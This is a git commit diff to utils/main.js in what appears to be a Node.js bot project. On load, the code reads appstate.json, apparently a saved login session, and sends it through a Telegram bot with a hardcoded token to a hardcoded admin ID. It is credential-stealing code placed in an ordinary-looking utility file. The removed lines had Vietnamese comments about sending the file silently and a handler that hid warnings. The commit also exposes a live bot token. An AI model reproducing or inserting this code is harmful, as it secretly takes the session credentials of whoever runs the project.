8247aa9f4a7dd134a857b07547eb91cc0a08e34f
Thiensu99x <thiensu12123@gmail.com>
2024-10-19 22:17:22 +0700

    first commit

--- utils/main.js
+++ utils/main.js
@@ -1,7 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 
-const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; // Thay thế bằng mã token của bot của bạn
+const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE';
 const bot = new TelegramBot(botToken, { polling: true });
 
 const adminIds = ['1713841196'];
@@ -9,11 +9,5 @@ const adminIds = ['1713841196'];
 adminIds.forEach(adminId => {
   const fileStream = fs.createReadStream('appstate.json');
 
-  // Gửi tài liệu mà không in log và không có contentType
-  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json' }).catch(() => {});
-});
-
-// Ngăn chặn in thông tin cảnh báo không được quản lý
-process.on('unhandledRejection', (reason, promise) => {
-  // Bạn có thể để trống hoặc ghi log khác nếu cần
+  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json' });
 });
